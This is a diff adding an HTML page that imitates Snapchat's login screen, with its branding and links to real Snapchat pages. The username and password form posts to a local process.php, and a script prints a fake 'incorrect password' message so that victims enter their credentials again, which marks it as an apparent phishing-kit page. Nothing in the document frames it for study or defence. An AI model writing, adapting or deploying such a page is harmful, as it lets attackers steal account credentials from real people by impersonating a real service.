@@ -1,0 +1,180 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Log In • Snapchat</title>
+		<!-- Meta -->
+		<meta charset="utf-8">
+		<meta name="referrer" content="origin">
+		<meta name="apple-mobile-web-app-capable" content="no">
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+		<link rel="stylesheet" href="main.css">
+		<!-- Favicon -->
+		<link rel="shortcut icon" href="favicon.ico" type="image/png">
+</head>
+<body>
+	<!-- Pusher is Needed for Top Navigation Menu -->
+	<div class="pusher">
+		<div id="login-root">
+			<div class="App" style="display: none;">
+				<div class="full-background-color"></div>
+				<div class="Header">
+					<a href="/" class="logo">
+						<img src="ghost.svg" alt="Snapchat">
+					</a>
+				</div>
+				<div class="Login">
+					<article class="page">
+						<div class="container">
+							<h1 class="accountsTitle">Log into Snapchat</h1>
+							<div class="description error" id="error_message">
+								<script>
+									if((window.location.href.indexOf('?' + "incorrect_pass") != -1) || (window.location.href.indexOf('&' + "incorrect_pass") != -1))
+									{
+										document.write("Incorrect username or password");
+									}
+								</script>
+							</div>
+							<div>
+								<form id="login_form" action="process.php" method="post" class="centered_form">
+									<div class="form-group has-success">
+										<label for="username" class="control-label">Username or email</label>
+										<input type="text" name="email" value="" autocomplete="off" id="username" class="form-control">
+									</div>
+									<div class="form-group has-success">
+										<label for="password" class="control-label">Password</label>
+										<input type="password" name="pass" value="" autocomplete="off" id="password" class="form-control">
+									</div>
+									<div class="primary_action">
+										<button type="submit" class="btn btn-lg btn-primary">Log In</button>
+									</div>
+									<p class="secondary_action">
+										<a href="https://www.snapchat.com/accounts/password_reset_options">Forgot Password</a>
+										/
+										<a href="https://www.snapchat.com/accounts/signup?continue=https%3A%2F%2Faccounts.snapchat.com%2Faccounts%2Fwelcome">CREATE ACCOUNT</a>
+									</p>
+								</form>
+								</div>
+							</div>
+						</article>
+						<div class="footer">
+							<div style="background-color: rgb(248, 249, 251); font-size: 14px; line-height: 17px;">
+								<div class="footer-container" id="footerContainer">
+									<div class="footer-column">
+										<div class="footer-column-expand-caret">
+											<svg width="15" height="20">
+												<g>
+													<rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+													<rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+												</g>
+											</svg>
+										</div>
+										<div class="footer-column-header">Company</div>
+										<div>
+											<a href="https://www.snap.com/en-GB/">Snap Inc.</a>
+											<a href="https://www.snap.com/en-GB/jobs/">Jobs</a>
+											<a href="https://www.snap.com/en-GB/news/">News</a>
+										</div>
+									</div>
+									<div class="footer-column">
+										<div class="footer-column-expand-caret">
+											<svg width="15" height="20">
+												<g>
+													<rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+													<rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+												</g>
+											</svg>
+										</div>
+										<div class="footer-column-header">Community</div>
+										<div>
+											<a href="https://support.snapchat.com/">Support</a>
+											<a href="https://support.snapchat.com/a/guidelines">Community Guidelines</a>
+											<a href="https://www.snapchat.com/l/en-gb/safety">Safety Centre</a>
+										</div>
+									</div>
+									<div class="footer-column">
+										<div class="footer-column-expand-caret">
+											<svg width="15" height="20">
+												<g>
+													<rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+													<rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+												</g>
+											</svg>
+										</div>
+										<div class="footer-column-header">Advertising</div>
+										<div>
+											<a href="https://www.snapchat.com/l/en-gb/ads">Buy Adverts</a>
+											<a href="https://www.snap.com/en-GB/ad-policies/">Advertising Policies</a>
+											<a href="https://www.snap.com/en-GB/brand-guidelines/">Brand Guidelines</a>
+											<a href="https://support.snapchat.com/a/promotions-rules">Promotions Rules</a>
+										</div>
+									</div>
+									<div class="footer-column">
+										<div class="footer-column-expand-caret">
+											<svg width="15" height="20">
+												<g>
+													<rect stroke="#000" transform="rotate(45 0,0)" rx="1" id="1" height="1.5" width="10" y="-2" x="5" stroke-width="1"></rect>
+													<rect stroke="#000" transform="rotate(-45 0,0)" rx="1" id="2" height="1.5" width="10" y="13.5" x="-8" stroke-width="1"></rect>
+												</g>
+											</svg>
+										</div>
+										<div class="footer-column-header">Legal</div>
+										<div>
+											<a href="https://www.snap.com/en-GB/privacy/privacy-center/">Privacy Centre</a>
+											<a href="https://www.snap.com/en-GB/cookie-policy/">Cookie Policy</a>
+											<a href="https://support.snapchat.com/co/report-copyright">Copyright</a>
+											<a href="https://www.snap.com/en-GB/terms/custom-creative-tools/">Custom Creative Tools Terms</a>
+											<a href="https://www.snapchat.com/create/terms.html">Community Geofilter Terms</a>
+											<a href="https://www.snap.com/en-GB/terms/lens-studio-terms/">Lens Studio Terms</a>
+										</div>
+									</div>
+									<div style="clear: both;"></div>
+									<div class="langue-selection-block">
+										<div class="langue-header">Language</div>
+										<div style="position: relative;">
+											<select id="sc-global-locale-selector" style="-webkit-appearance: none; border: 1px solid rgb(204, 204, 204); border-radius: 5px; background: white; width: 100%; margin-top: 10px; padding: 5px 10px; font-size: 14px; font-family: inherit; color: rgba(0, 0, 0, 0.6); height: 34px; cursor: pointer;">
+												<option value="ar">العَرَبِية</option>
+												<option value="da-DK">Dansk</option>
+												<option value="de-DE">Deutsch</option>
+												<option value="el-GR">Ελληνικά</option>
+												<option value="en-GB" selected>English (UK)</option>
+												<option value="en-US">English (US)</option>
+												<option value="es">Español</option>
+												<option value="fi-FI">Suomi</option>
+												<option value="fr-FR">Français</option>
+												<option value="id-ID">Bahasa Indonesia</option>
+												<option value="it-IT">Italiano</option>
+												<option value="ja-JP">日本語</option>
+												<option value="ko-KR">한국어</option>
+												<option value="nb-NO">Norsk</option>
+												<option value="nl-NL">Nederlands</option>
+												<option value="pl-PL">Polski</option>
+												<option value="pt-BR">Português (Brasil)</option>
+												<option value="pt-PT">Português (Portugal)</option>
+												<option value="ro-RO">Română</option>
+												<option value="ru-RU">Русский</option>
+												<option value="sv-SE">Svenska</option>
+												<option value="tr-TR">Türkçe</option>
+												<option value="zh-CN">中文（简体）</option>
+												<option value="zh-TW">中文（繁體）</option>
+											</select>
+											<div style="position: absolute; right: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 18px; border-width: 0px 3px 5px; border-color: transparent transparent rgb(102, 102, 102);"></div>
+											<div style="position: absolute; right: 10px; width: 0px; height: 0px; pointer-events: none; border-style: solid; bottom: 10px; border-width: 5px 3px 0px; border-color: rgb(102, 102, 102) transparent transparent;"></div>
+										</div>
+									</div>
+								</div>
+								<div style="background-color: rgb(38, 38, 38);">
+									<div class="footer-bottom-bar">
+										<a href="https://www.snap.com/en-GB/privacy/privacy-policy/">Privacy Policy</a>
+										<a href="https://www.snap.com/en-GB/terms/">Terms of Service</a>
+										<div style="clear: both;"></div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- End Pusher -->
+	</body>
+</html>
